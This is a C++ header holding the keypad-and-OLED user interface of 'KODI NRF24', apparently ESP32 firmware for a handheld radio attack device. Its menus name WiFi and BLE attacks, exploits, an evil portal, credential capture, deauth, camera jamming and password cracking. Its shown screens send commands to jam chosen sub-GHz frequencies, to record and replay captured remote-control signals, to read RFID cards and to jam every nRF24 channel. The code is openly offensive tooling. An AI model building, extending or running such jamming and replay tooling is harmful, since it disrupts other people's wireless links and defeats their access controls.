#pragma once
// ############################################################################
//  gh_ui.h  -  KODI NRF24  /  Hub UI (4x4 keypad + dual OLED)
//
//  Layout is built for the common two-colour OLED (top ~16px YELLOW, rest BLUE
//  with a dead gap at the seam): the header lives in the yellow band, and all
//  content starts at y=18 so nothing lands on the seam.
//
//  2=UP 8=DOWN 5=SELECT *=BACK #=HOME. Hold 5=long action. Hold *=HOME.
// ############################################################################

#include <Arduino.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "gh_config.h"
#include "gh_input.h"
#include "gh_audio.h"
#include "gh_nrf.h"
#include "gh_store.h"
#include "gh_boot.h"
#include "gh_detect.h"
#include "gh_wifi_tx.h"
#include "gh_ble_tx.h"
#include "gh_portal.h"
#include "gh_crack.h"

#define RF24_PA_MIN  0
#define RF24_PA_LOW  1
#define RF24_PA_HIGH 2
#define RF24_PA_MAX  3

static TwoWire ggWire1 = TwoWire(1);
static Adafruit_SSD1306 ggOled(128, 64, &ggWire1, -1);  // UI OLED on bus 1
static Adafruit_SSD1306 ggOledSt(128, 64, &Wire, -1);   // Status OLED on bus 0
static bool ggOledOk = false;
static bool ggOledStOk = false;

// ---- layout (dodge the yellow/blue seam at ~y16) ----
#define GG_ROW0  14
#define GG_ROWH  10
#define GG_ROWS  4

// ===== app state ===========================================================
static GgNrfProfile gNrfA, gNrfB;
static GgSettings   gSet;
static uint8_t  gHotActive = 0;
static uint32_t gTxCount = 0, gAckOk = 0, gTxFail = 0, gRxCount = 0;
static bool     gLastOk = false, gBeaconOn = false, gCarrierOn = false, gScanPause = false;
static uint32_t gBeaconLast = 0, gPhase = 0;
static uint16_t gBurstLeft = 0; static uint32_t gBurstNext = 0;
static bool     gAutoFire = false;   // "Load & send" asks the SEND screen to fire on entry
static uint8_t  gRxLast[GG_PAYLOAD_MAX], gRxLen = 0, gRxPipe = 0;
static GgWifiTxCfg gWifiTx;
static GgBleTxCfg  gBleTx;
static uint32_t gWifiTxStartMs = 0;
static bool     gWifiFloodMode = false;

// Batch 2 state
static uint16_t gTimeBombDelay = 30;
static uint32_t gTimeBombStartMs = 0;
static bool     gTimeBombArmed = false;
static char     gGeofenceSsid[33] = "";
static uint8_t  gGeofenceCh = 1;
static bool     gGeofenceFound = false;
static uint32_t gGeofenceLastScan = 0;
static uint8_t  gChainPhase = 0;
static uint32_t gChainPhaseMs = 0;
static bool     gChainWifiUp = false, gChainBleUp = false;
static uint8_t  gProgPwr = 0;
static uint32_t gProgLastRamp = 0;
static bool     gProgWifiUp = false, gProgBleUp = false;
static uint8_t  gAtkTimerType = 0;
static uint16_t gAtkTimerSec = 30;
static uint32_t gAtkTimerStart = 0;
static bool     gAtkTimerArmed = false;
static uint8_t  gHeatData[14];
static uint8_t  gHeatCh = 0;
static volatile uint32_t gPktRateCnt = 0; static uint32_t gPktRateLastMs = 0;
static uint16_t gPktRatePerSec = 0;
static bool     gPktRateOn = false;

// ---- grid HOME state ----
static uint8_t gGridPage = 0;
static uint8_t gGridSel  = 0;

static void ggPktRateSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  (void)buf; (void)type;
  gPktRateCnt++;
}

// ===== display + helpers ===================================================
static inline bool ggOledBegin() {
  ggWire1.begin(GG_PIN_SDA1, GG_PIN_SCL1, GG_I2C1_HZ);
  delay(20);
  ggOledOk = ggOled.begin(SSD1306_SWITCHCAPVCC, GG_OLED1_ADDR);
  if (!ggOledOk) ggOledOk = ggOled.begin(SSD1306_SWITCHCAPVCC, 0x3D);
  if (ggOledOk) {
    ggOled.ssd1306_command(0x8D); ggOled.ssd1306_command(0x14);
    ggOled.ssd1306_command(0x81); ggOled.ssd1306_command(0xFF);
    ggOled.clearDisplay(); ggOled.display();
  }
  Wire.begin(GG_PIN_SDA0, GG_PIN_SCL0, GG_I2C0_HZ);
  delay(20);
  ggOledStOk = ggOledSt.begin(SSD1306_SWITCHCAPVCC, GG_OLED0_ADDR);
  if (!ggOledStOk) ggOledStOk = ggOledSt.begin(SSD1306_SWITCHCAPVCC, 0x3D);
  if (ggOledStOk) {
    ggOledSt.ssd1306_command(0x8D); ggOledSt.ssd1306_command(0x14);
    ggOledSt.ssd1306_command(0x81); ggOledSt.ssd1306_command(0xFF);
    ggOledSt.clearDisplay(); ggOledSt.display();
  }
  return ggOledOk;
}
static inline void ggHeader(const char* title) {
  ggOled.fillRect(0, 0, 128, 12, SSD1306_WHITE);
  ggOled.setTextColor(SSD1306_BLACK); ggOled.setTextSize(1);
  ggOled.setCursor(2, 2); ggOled.print(title);
  char st[8]; snprintf(st, sizeof(st), "%c%c %s",
    ggNrfPresentA ? 'A' : '-', ggNrfPresentB ? 'B' : '-',
    kbIsLinked(ghBridge) ? "CC" : "--");
  ggOled.setCursor(128 - (int)strlen(st) * 6 - 1, 2); ggOled.print(st);
  ggOled.setTextColor(SSD1306_WHITE);
}
// menu with a one-line hint for the highlighted row
static inline void ggMenu(const char* title, const char* const items[], int n, int sel, int& top, const char* hint) {
  ggOled.clearDisplay();
  ggHeader(title);
  if (sel < top) top = sel;
  if (sel > top + GG_ROWS - 1) top = sel - (GG_ROWS - 1);
  if (top < 0) top = 0;
  for (int i = 0; i < GG_ROWS; i++) {
    int idx = top + i; if (idx >= n) break;
    int y = GG_ROW0 + i * GG_ROWH;
    if (idx == sel) { ggOled.fillRect(0, y - 1, 128, GG_ROWH, SSD1306_WHITE); ggOled.setTextColor(SSD1306_BLACK); }
    else ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(3, y); ggOled.print(items[idx]);
  }
  ggOled.setTextColor(SSD1306_WHITE);
  if (top > 0)            ggOled.fillTriangle(122, 16, 126, 16, 124, 13, SSD1306_WHITE);
  if (top + GG_ROWS < n)  ggOled.fillTriangle(122, 50, 126, 50, 124, 53, SSD1306_WHITE);
  if (hint && hint[0]) {
    ggOled.fillRect(0, 54, 128, 10, SSD1306_WHITE);
    ggOled.setTextColor(SSD1306_BLACK);
    ggOled.setCursor(2, 56); ggOled.print(hint);
    ggOled.setTextColor(SSD1306_WHITE);
  }
  ggOled.display();
}
// Compact TX activity mark: a small icon with one expanding ring. Kept within a
// ~15px radius so it never sweeps into the text column (which starts at x=34).
static inline void ggBurstMark(int cx, int cy, int phase) {
  int r = 8 + (phase % 7);
  ggOled.drawCircle(cx, cy, r, SSD1306_WHITE);
  ggOled.fillCircle(cx, cy, 3, SSD1306_WHITE);
}
static inline void ggStepU8(uint8_t& v, int dir, int lo, int hi) {
  int x = (int)v + dir; if (x < lo) x = hi; if (x > hi) x = lo; v = (uint8_t)x;
}
static inline void ggStepU16(uint16_t& v, int dir, int step, int lo, int hi) {
  int x = (int)v + dir*step; if (x < lo) x = lo; if (x > hi) x = hi; v = (uint16_t)x;
}
static inline void ggCycle(uint8_t& v, uint8_t n, int dir) { v = (uint8_t)((v + n + dir) % n); }
// Compact a counter so it never overruns its field: <100k as-is, then 123k, 1.2M.
static inline const char* ggFmtCount(uint32_t v) {
  static char b[10];
  if (v < 100000UL)        snprintf(b,sizeof(b),"%lu",(unsigned long)v);
  else if (v < 1000000UL)  snprintf(b,sizeof(b),"%luk",(unsigned long)(v/1000UL));
  else                     snprintf(b,sizeof(b),"%lu.%luM",(unsigned long)(v/1000000UL),(unsigned long)((v%1000000UL)/100000UL));
  return b;
}

// ===== nRF mode orchestration (ESP-NOW proxy) ==============================
static inline int  ggNrfActiveRadio() { return gHotActive ? 1 : 0; }
static inline bool ggNrfActiveP() { return gHotActive ? ggNrfPresentB : ggNrfPresentA; }
static inline int  ggNrfToolRadio()  { return ggNrfPresentA ? 0 : 1; }
static inline bool ggNrfToolP() { return ggNrfPresentA || ggNrfPresentB; }
static inline void ggNrfConfigureForTx() {
  switch (gSet.nrfMode) {
    case GG_NM_PAIR:
      if (ggNrfPresentA) ggNrfConfigTx(0, gNrfA);
      if (ggNrfPresentB) ggNrfConfigRx(1, gNrfA);
      break;
    case GG_NM_DUALTX: {
      GgNrfProfile na = gNrfA; na.autoAck = 0;
      GgNrfProfile nb = gNrfB; nb.autoAck = 0;
      if (ggNrfPresentA) ggNrfConfigTx(0, na);
      if (ggNrfPresentB) ggNrfConfigTx(1, nb);
      break;
    }
    case GG_NM_HOTSWAP: {
      GgNrfProfile p = gNrfA; p.autoAck = 0;
      if (ggNrfActiveP()) ggNrfConfigTx(ggNrfActiveRadio(), p);
      break;
    }
  }
}
static inline bool ggNrfSendOne() {
  bool ok = false;
  switch (gSet.nrfMode) {
    case GG_NM_PAIR:   if (ggNrfPresentA) ok = ggNrfTxOnce(0, gNrfA, gTxCount); break;
    case GG_NM_DUALTX: {
      bool a = ggNrfPresentA ? ggNrfTxOnce(0, gNrfA, gTxCount) : false;
      bool b = ggNrfPresentB ? ggNrfTxOnce(1, gNrfB, gTxCount) : false;
      ok = a || b; break;
    }
    case GG_NM_HOTSWAP: if (ggNrfActiveP()) ok = ggNrfTxOnce(ggNrfActiveRadio(), gNrfA, gTxCount); break;
  }
  gTxCount++; gLastOk = ok;
  if (gSet.nrfMode == GG_NM_PAIR && gNrfA.autoAck) { if (ok) gAckOk++; else gTxFail++; }
  return ok;
}
static inline void ggNrfPollPair() {
  if (gSet.nrfMode != GG_NM_PAIR || !ggNrfPresentB) return;
  uint8_t len = 0, pipe = 0;
  if (ggNrfRxPoll(1, gRxLast, &len, &pipe)) { gRxLen = len; gRxPipe = pipe; gRxCount++; }
}

// ===== screen machine ======================================================
enum GgScreen : uint8_t {
  GS_HOME=0, GS_NRF, GS_ADV, GS_MODES, GS_COP_SCAN, GS_TRACKER_SCAN,
  GS_NRF_TX, GS_NRF_BEACON, GS_NRF_CARRIER,
  GS_NRF_SCAN, GS_NRF_RX, GS_NPROF, GS_PROFACT, GS_SETTINGS, GS_SYSTEM,
  GS_HELP, GS_HELPPAGE, GS_BYTES, GS_PAYLIB, GS_PAYACT,
  GS_WIFI_TX, GS_WIFI_TX_RUN, GS_WIFI_PICK, GS_BLE_TX, GS_BLE_TX_RUN, GS_BLE_SCAN,
  GS_JAM_PICK, GS_JAM_RUN, GS_KPAD_RUN, GS_RAD_PICK, GS_RAD_RUN, GS_SPAM_RUN, GS_BLESPAM_RUN,
  GS_EVIL_PICK, GS_EVIL_RUN, GS_PROBE_RUN, GS_CRED_VIEW,
  GS_RICK_MENU, GS_RICK_RUN, GS_SLOCK_RUN, GS_NET_AUDIT, GS_NET_DETAIL,
  GS_AUTH_PICK, GS_AUTH_RUN, GS_FUZZ_RUN, GS_QUIET_PICK, GS_QUIET_RUN,
  GS_CLONE_PICK, GS_CLONE_RUN, GS_FARM_RUN, GS_TIMEBOMB, GS_DEAUTH_DET,
  GS_GEOFENCE, GS_MAC_HARVEST, GS_PROX_ALERT, GS_UUID_SCAN, GS_BLE_RANGE,
  GS_CHAIN_RUN, GS_PROG_JAM, GS_AUTO_TARGET,
  GS_HEATMAP, GS_BAND_OCC, GS_PKTRATE, GS_ATK_TIMER,
  GS_CRACK_PICK, GS_CRACK_CAP, GS_CRACK_DONE,
  GS_BLACKOUT,
  // ---- category sub-menus ----
  GS_CAT_WIFI, GS_CAT_BLE, GS_CAT_NRF, GS_CAT_COMBO,
  GS_CAT_RECON, GS_CAT_EXPLOIT, GS_CAT_TOOLS, GS_CAT_SYSTEM,
  // ---- new tool screens ----
  GS_NRF_JAM,
  GS_HIDDEN_SCAN, GS_CAMERA_JAM, GS_SIGNAL_METER,
  // ---- CC1101 bridge screens ----
  GS_CC_TX, GS_CC_JAM, GS_CC_SCAN, GS_CC_RFID, GS_CC_REC,
  // ---- dual-band screens ----
  GS_DUAL_JAM, GS_DUAL_SCAN
};
static uint8_t gScreen = GS_HOME;
static uint8_t gStack[10]; static uint8_t gStackTop = 0;
static uint8_t gSel = 0; static int gTop = 0; static bool gRunInit = false;
static bool    gEditing = false;
static uint8_t* gBBuf=nullptr; static uint8_t gBN=0, gBIdx=0; static const char* gBTitle="BYTES"; static bool gBAscii=false;
static uint8_t* gBLenPtr=nullptr; static uint8_t gBLenMax=GG_PAYLOAD_MAX;  // if set, editor can grow length
static uint8_t  gSlot = 0, gHelpSel = 0, gPaySlot = 0;
static GgNrfProfile* gNrfCfg = &gNrfA;

static inline void ggGo(uint8_t s) {
  if (gStackTop < sizeof(gStack)) gStack[gStackTop++] = gScreen;
  gScreen = s; gSel = 0; gTop = 0; gRunInit = false; gEditing = false;
}
static inline void ggBack() {
  if (gStackTop > 0) gScreen = gStack[--gStackTop]; else gScreen = GS_HOME;
  gSel = 0; gTop = 0; gRunInit = false; gEditing = false;
}
static inline void ggHome() { gStackTop = 0; gScreen = GS_HOME; gSel = 0; gTop = 0; gRunInit = false; gEditing = false; }
// ---- flood nRF helpers are in gh_nrf.h (ESP-NOW proxy) ----
static inline void ggStopTx() {
  gBeaconOn = false; gBurstLeft = 0;
  if (gCarrierOn) { ggNrfCarrierOff(0); gCarrierOn = false; }
  ggFloodNrfStop();
  ggNrfStopAll();
  if (gCcJamUp || gCcRecUp || gDualJamUp || gDualScanUp) {
    KodiBridge msg; KbCcPayload cc = {};
    kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_STOP, cc);
    ghBridgeSend(msg);
    gCcJamUp = false; gCcRecUp = false; gDualJamUp = false; gDualScanUp = false;
  }
  if (ggPortalActive) ggPortalEnd();
  if (ggProbeActive)  ggProbeEnd();
  ggWifiTxPaused = false;
  if (ggWifiTxRun)    ggWifiTxEnd();
  if (ggCopRunning)   ggCopScanEnd();
  if (ggTrkBleReady)  ggTrkScanEnd();
  ggBleFloodMode = false;
  if (ggBleTxActive) ggBleTxEnd();
  else if (ggBleTxReady) { delay(50); BLEDevice::deinit(false); delay(100); ggBleTxReady=false; }
}
static inline void ggOpenBytes(uint8_t* b, uint8_t n, const char* t, bool ascii,
                               uint8_t* lenPtr=nullptr, uint8_t lenMax=GG_PAYLOAD_MAX) {
  gBBuf=b; gBN=(n>GG_PAYLOAD_MAX)?GG_PAYLOAD_MAX:n; if(gBN<1)gBN=1; gBIdx=0; gBTitle=t; gBAscii=ascii;
  gBLenPtr=lenPtr; gBLenMax=(lenMax>GG_PAYLOAD_MAX)?GG_PAYLOAD_MAX:lenMax;
  ggGo(GS_BYTES);
}
static inline void ggMove(int lo, int hi) {
  if (gEv.up)    ggStepU8(gSel, -1, lo, hi);
  if (gEv.down)  ggStepU8(gSel, +1, lo, hi);
  if (gEv.left)  { int x=(int)gSel-4; if(x<lo) x=lo; gSel=(uint8_t)x; }
  if (gEv.right) { int x=(int)gSel+4; if(x>hi) x=hi; gSel=(uint8_t)x; }
}

// ---------------------------------------------------------------- GRID HOME
static inline void ggGrid(const char* title, const char* const labels[], uint8_t sel, uint8_t page, uint8_t pages) {
  ggOled.clearDisplay();
  ggHeader(title);
  for (uint8_t i = 0; i < 4; i++) {
    int x = (i & 1) ? 66 : 2;
    int y = (i >> 1) ? 34 : 14;
    if (i == sel) {
      ggOled.fillRoundRect(x, y, 60, 18, 3, SSD1306_WHITE);
      ggOled.setTextColor(SSD1306_BLACK);
    } else {
      ggOled.drawRoundRect(x, y, 60, 18, 3, SSD1306_WHITE);
      ggOled.setTextColor(SSD1306_WHITE);
    }
    int tw = strlen(labels[i]) * 6;
    ggOled.setCursor(x + (60 - tw) / 2, y + 5);
    ggOled.print(labels[i]);
  }
  ggOled.setTextColor(SSD1306_WHITE);
  for (uint8_t p = 0; p < pages; p++) {
    int dx = 64 - ((pages - 1) * 5) + p * 10;
    if (p == page) ggOled.fillCircle(dx, 58, 2, SSD1306_WHITE);
    else ggOled.drawCircle(dx, 58, 2, SSD1306_WHITE);
  }
  ggOled.display();
}

static const char* const GG_GRID_P0[] = { "WiFi ATK", "BLE ATK", "nRF Radio", "Combo ATK" };
static const char* const GG_GRID_P1[] = { "Recon", "Exploits", "Tools", "System" };
static const char* const* const GG_GRID_PAGES[] = { GG_GRID_P0, GG_GRID_P1 };
static const uint8_t GG_GRID_CAT[] = {
  GS_CAT_WIFI, GS_CAT_BLE, GS_CAT_NRF, GS_CAT_COMBO,
  GS_CAT_RECON, GS_CAT_EXPLOIT, GS_CAT_TOOLS, GS_CAT_SYSTEM
};

static inline void ggScreenHome() {
  if (gEv.down) {
    if (gGridSel < 3) gGridSel++; else { gGridSel = 0; gGridPage = (gGridPage + 1) % 2; }
  }
  if (gEv.up) {
    if (gGridSel > 0) gGridSel--; else { gGridSel = 3; gGridPage = (gGridPage + 2 - 1) % 2; }
  }
  if (gEv.right) { gGridPage = (gGridPage + 1) % 2; }
  if (gEv.left)  { gGridPage = (gGridPage + 1) % 2; }
  if (gEv.sel) { ggGo(GG_GRID_CAT[gGridPage * 4 + gGridSel]); return; }
  // Number shortcuts: 1=WiFi,3=BLE,7=nRF,9=Combo, A=Recon,B=Exploit,C=Tools,D=System
  switch (gLastKey) {
    case '1': ggGo(GS_CAT_WIFI);    return;
    case '3': ggGo(GS_CAT_BLE);     return;
    case '7': ggGo(GS_CAT_NRF);     return;
    case '9': ggGo(GS_CAT_COMBO);   return;
    case 'A': ggGo(GS_CAT_RECON);   return;
    case 'B': ggGo(GS_CAT_EXPLOIT); return;
    case 'C': ggGo(GS_CAT_TOOLS);   return;
    case 'D': ggGo(GS_CAT_SYSTEM);  return;
    case '0': ggGo(GS_SETTINGS);    return;
  }
  ggGrid("KODI NRF24", GG_GRID_PAGES[gGridPage], gGridSel, gGridPage, 2);
}

// ---------------------------------------------------------------- CC1101 BRIDGE SCREENS
// State for CC1101 bridge operations
static float    gCcFreq   = 433.92f;
static uint8_t  gCcRadio  = 0;     // 0=A, 1=B
static uint32_t gCcStartMs = 0;

static inline void ggScreenCcTx() {
  if (!kbIsLinked(ghBridge)) {
    if (gEv.back) { ggBack(); return; }
    ggOled.clearDisplay(); ggHeader("CC1101 TX");
    ggOled.setCursor(4, 24); ggOled.print(F("Bridge OFFLINE"));
    ggOled.setCursor(4, 36); ggOled.print(F("Link CC1101 first"));
    ggOled.display(); return;
  }
  if (gEv.up)   gCcFreq += 1.0f;
  if (gEv.down) gCcFreq -= 1.0f;
  if (gCcFreq < 300.0f) gCcFreq = 300.0f;
  if (gCcFreq > 928.0f) gCcFreq = 928.0f;
  if (gEv.left || gEv.right) gCcRadio ^= 1;
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    KodiBridge msg;
    KbCcPayload cc = {};
    cc.radio = gCcRadio;
    cc.freq = gCcFreq;
    cc.mod = 0; cc.rate = 1; cc.power = 7;
    cc.pktLen = 5;
    memset(cc.payload, 0xAA, 5);
    cc.burstN = 10; cc.gapMs = 50;
    kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_TX, cc);
    ghBridgeSend(msg);
    ggClickOk();
  }
  ggOled.clearDisplay(); ggHeader("CC1101 TX");
  ggOled.setCursor(4, 16); ggOled.printf("Freq: %.2f MHz", gCcFreq);
  ggOled.setCursor(4, 28); ggOled.printf("Radio: %c", gCcRadio ? 'B' : 'A');
  if (gCcTxResult != 0 && millis() - gCcTxResultMs < 3000) {
    ggOled.setTextSize(2);
    ggOled.setCursor(10, 40);
    ggOled.print(gCcTxResult == 1 ? F("TX OK") : F("TX FAIL"));
    ggOled.setTextSize(1);
  } else {
    if (gCcTxResult != 0) gCcTxResult = 0;
    ggOled.setCursor(4, 40); ggOled.print(F("UP/DN=freq L/R=radio"));
    ggOled.setCursor(4, 52); ggOled.print(F("SEL=send BACK=exit"));
  }
  ggOled.display();
}

static inline void ggScreenCcJam() {
  if (!kbIsLinked(ghBridge)) {
    if (gEv.back) { gCcJamUp = false; ggBack(); return; }
    ggOled.clearDisplay(); ggHeader("CC1101 JAM");
    ggOled.setCursor(4, 24); ggOled.print(F("Bridge OFFLINE"));
    ggOled.setCursor(4, 36); ggOled.print(F("Link CC1101 first"));
    ggOled.display(); return;
  }
  if (gEv.up)   gCcFreq += 1.0f;
  if (gEv.down) gCcFreq -= 1.0f;
  if (gCcFreq < 300.0f) gCcFreq = 300.0f;
  if (gCcFreq > 928.0f) gCcFreq = 928.0f;
  if (!gCcJamUp && (gEv.left || gEv.right)) gCcRadio ^= 1;
  if (gEv.back) {
    if (gCcJamUp) {
      KodiBridge msg;
      KbCcPayload cc = {};
      kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_STOP, cc);
      ghBridgeSend(msg);
      gCcJamUp = false;
    }
    ggBack(); return;
  }
  if (gEv.sel && !gCcJamUp) {
    KodiBridge msg;
    KbCcPayload cc = {};
    cc.radio = gCcRadio;
    cc.freq = gCcFreq;
    kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_JAM, cc);
    ghBridgeSend(msg);
    gCcJamUp = true;
    gCcStartMs = millis();
    ggClickOk();
  }
  ggOled.clearDisplay(); ggHeader("CC1101 JAM");
  ggOled.setCursor(4, 16); ggOled.printf("Freq: %.2f MHz", gCcFreq);
  ggOled.setCursor(100, 16); ggOled.printf("R:%c", gCcRadio ? 'B' : 'A');
  if (gCcJamUp) {
    uint32_t el = (millis() - gCcStartMs) / 1000;
    ggOled.setTextSize(2);
    ggOled.setCursor(20, 28); ggOled.print(F("JAMMING"));
    ggOled.setTextSize(1);
    ggOled.setCursor(4, 48); ggOled.printf("%lus  BACK=stop", (unsigned long)el);
  } else {
    ggOled.setCursor(4, 28); ggOled.print(F("UP/DN=freq L/R=radio"));
    ggOled.setCursor(4, 40); ggOled.print(F("SEL=start BACK=exit"));
  }
  ggOled.display();
}

static inline void ggScreenCcScan() {
  if (!kbIsLinked(ghBridge)) {
    if (gEv.back) { ggBack(); return; }
    ggOled.clearDisplay(); ggHeader("CC SCAN");
    ggOled.setCursor(4, 24); ggOled.print(F("Bridge OFFLINE"));
    ggOled.setCursor(4, 36); ggOled.print(F("Link CC1101 first"));
    ggOled.display(); return;
  }
  if (gEv.left || gEv.right) gCcRadio ^= 1;
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    gCcScanReady = false;
    KodiBridge msg;
    KbCcPayload cc = {};
    cc.radio = gCcRadio;
    cc.freq = gCcFreq;
    kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_SCAN, cc);
    ghBridgeSend(msg);
    ggClickOk();
  }
  ggOled.clearDisplay(); ggHeader("CC SCAN");
  if (gCcScanReady && gCcScanSteps > 0) {
    for (int i = 0; i < gCcScanSteps && i < 64; i++) {
      int h = gCcScanRssi[i] + 110;
      if (h < 0) h = 0;
      if (h > 30) h = 30;
      int x = (i * 126) / gCcScanSteps + 1;
      if (h > 0) ggOled.drawFastVLine(x, 44 - h, h, SSD1306_WHITE);
    }
    ggOled.drawFastHLine(0, 44, 128, SSD1306_WHITE);
    ggOled.setCursor(2, 46); ggOled.printf("%.0f-%.0f MHz", gCcFreq, gCcFreq + 10.0f);
    ggOled.setCursor(2, 56); ggOled.print(F("SEL=rescan BACK=exit"));
  } else {
    ggOled.setCursor(4, 16); ggOled.printf("Start: %.0f MHz", gCcFreq);
    ggOled.setCursor(4, 28); ggOled.printf("End:   %.0f MHz", gCcFreq + 10.0f);
    ggOled.setCursor(4, 42); ggOled.print(F("SEL=scan BACK=exit"));
  }
  ggOled.display();
}

static inline void ggScreenCcRfid() {
  if (!kbIsLinked(ghBridge)) {
    if (gEv.back) { ggBack(); return; }
    ggOled.clearDisplay(); ggHeader("RFID READ");
    ggOled.setCursor(4, 24); ggOled.print(F("Bridge OFFLINE"));
    ggOled.setCursor(4, 36); ggOled.print(F("Link CC1101 first"));
    ggOled.display(); return;
  }
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    gCcRfidReady = false;
    KodiBridge msg;
    msg.magic = KB_MAGIC; msg.src = KB_UNIT_NRF24;
    msg.msgType = KB_MSG_CMD; msg.seq = ghBridge.seq++;
    msg.cmd = KB_RFID_READ; msg.len = 0;
    ghBridgeSend(msg);
    ggClickOk();
  }
  ggOled.clearDisplay(); ggHeader("RFID READ");
  if (gCcRfidReady) {
    ggOled.setCursor(4, 16); ggOled.printf("UID: %s", gCcRfidUid);
    ggOled.setCursor(4, 28); ggOled.printf("Bytes: %d", gCcRfidLen);
    ggOled.setCursor(4, 42); ggOled.print(F("SEL=rescan BACK=exit"));
  } else {
    ggOled.setCursor(4, 16); ggOled.print(F("Place card on PN532"));
    ggOled.setCursor(4, 28); ggOled.print(F("(on CC1101 node)"));
    ggOled.setCursor(4, 42); ggOled.print(F("SEL=read BACK=exit"));
  }
  ggOled.display();
}

// ---------------------------------------------------------------- CC1101 RECORD / REPLAY
static bool     gCcRecDone   = false;

static inline void ggScreenCcRec() {
  if (!kbIsLinked(ghBridge)) {
    if (gEv.back) { gCcRecUp = false; ggBack(); return; }
    ggOled.clearDisplay(); ggHeader("CC REC");
    ggOled.setCursor(4, 24); ggOled.print(F("Bridge OFFLINE"));
    ggOled.setCursor(4, 36); ggOled.print(F("Link CC1101 first"));
    ggOled.display(); return;
  }
  if (gEv.up)   gCcFreq += 0.1f;
  if (gEv.down) gCcFreq -= 0.1f;
  if (gCcFreq < 300.0f) gCcFreq = 300.0f;
  if (gCcFreq > 928.0f) gCcFreq = 928.0f;
  if (!gCcRecUp && (gEv.left || gEv.right)) gCcRadio ^= 1;
  if (gEv.back) {
    if (gCcRecUp) {
      KodiBridge msg;
      KbCcPayload cc = {};
      kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_STOP, cc);
      ghBridgeSend(msg);
      gCcRecUp = false;
    }
    ggBack(); return;
  }
  if (gEv.sel) {
    if (gCcRecUp) {
      KodiBridge msg;
      KbCcPayload cc = {};
      kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_STOP, cc);
      ghBridgeSend(msg);
      gCcRecUp = false;
      gCcRecDone = true;
      ggClickOk();
    } else {
      KodiBridge msg;
      KbCcPayload cc = {};
      cc.radio = gCcRadio;
      cc.freq = gCcFreq;
      kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_REC, cc);
      ghBridgeSend(msg);
      gCcRecResult = 0;
      gCcRecUp = true;
      gCcRecDone = false;
      ggClickOk();
    }
  }
  if (gEv.selLong && !gCcRecUp && gCcRecDone) {
    gCcReplayResult = 0;
    KodiBridge msg;
    KbCcPayload cc = {};
    cc.radio = gCcRadio;
    kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_REPLAY, cc);
    ghBridgeSend(msg);
    ggClickOk();
  }
  ggOled.clearDisplay(); ggHeader("CC REC/REPLAY");
  ggOled.setCursor(4, 16); ggOled.printf("Freq: %.2f MHz", gCcFreq);
  if (gCcRecUp) {
    ggOled.setTextSize(2);
    ggOled.setCursor(10, 28); ggOled.print(F("REC"));
    ggOled.setTextSize(1);
    ggOled.setCursor(4, 48); ggOled.print(F("SEL=stop  BACK=abort"));
  } else if (gCcRecResult == 2 && millis() - gCcRecResultMs < 3000) {
    ggOled.setTextSize(2);
    ggOled.setCursor(4, 28); ggOled.print(F("REC FAIL"));
    ggOled.setTextSize(1);
    ggOled.setCursor(4, 48); ggOled.print(F("Check CC1101 node"));
  } else if (gCcRecDone) {
    ggOled.setCursor(4, 28); ggOled.print(F("Signal captured!"));
    if (gCcReplayResult != 0 && millis() - gCcReplayResultMs < 3000) {
      ggOled.setCursor(4, 40);
      ggOled.print(gCcReplayResult == 1 ? F("REPLAY SENT") : F("REPLAY FAIL"));
    } else {
      if (gCcReplayResult != 0) gCcReplayResult = 0;
      ggOled.setCursor(4, 40); ggOled.print(F("SEL=re-record"));
      ggOled.setCursor(4, 52); ggOled.print(F("holdSEL=REPLAY"));
    }
  } else {
    if (gCcRecResult != 0) gCcRecResult = 0;
    ggOled.setCursor(4, 28); ggOled.print(F("UP/DN=freq (0.1MHz)"));
    ggOled.setCursor(4, 40); ggOled.print(F("SEL=start recording"));
    ggOled.setCursor(4, 52); ggOled.print(F("Captures ASK/OOK RF"));
  }
  ggOled.display();
}

// ---------------------------------------------------------------- DUAL-BAND JAM
static uint32_t gDualJamMs   = 0;
static float    gDualCcFreq  = 433.92f;

static inline void ggScreenDualJam() {
  if (!kbIsLinked(ghBridge)) {
    if (gEv.back) {
      if (gDualJamUp) { ggFloodNrfStop(); gDualJamUp = false; }
      ggBack(); return;
    }
    ggOled.clearDisplay(); ggHeader("DUAL JAM");
    ggOled.setCursor(4, 24); ggOled.print(F("Bridge OFFLINE"));
    ggOled.setCursor(4, 36); ggOled.print(F("Link CC1101 first"));
    ggOled.display(); return;
  }
  if (gEv.up)   gDualCcFreq += 1.0f;
  if (gEv.down) gDualCcFreq -= 1.0f;
  if (gDualCcFreq < 300.0f) gDualCcFreq = 300.0f;
  if (gDualCcFreq > 928.0f) gDualCcFreq = 928.0f;
  if (gEv.back) {
    if (gDualJamUp) {
      ggFloodNrfStop();
      KodiBridge msg;
      KbCcPayload cc = {};
      kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_CC_STOP, cc);
      ghBridgeSend(msg);
      gDualJamUp = false;
    }
    ggBack(); return;
  }
  if (gEv.sel && !gDualJamUp) {
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    GgNrfProfile p = ggDefaultNrf(); p.channel = 0;
    GhNodeCmd c = ghBuildCmd(GH_CMD_NRF_JAM, p);
    c.radio = 2;
    ghSendCmd(c);
    ggFloodNrfActive = true;
    KodiBridge msg;
    KbCcPayload cc = {};
    cc.freq = gDualCcFreq;
    kbBuildCcCmd(msg, KB_UNIT_NRF24, ghBridge.seq++, KB_DUAL_JAM, cc);
    ghBridgeSend(msg);
    gDualJamUp = true;
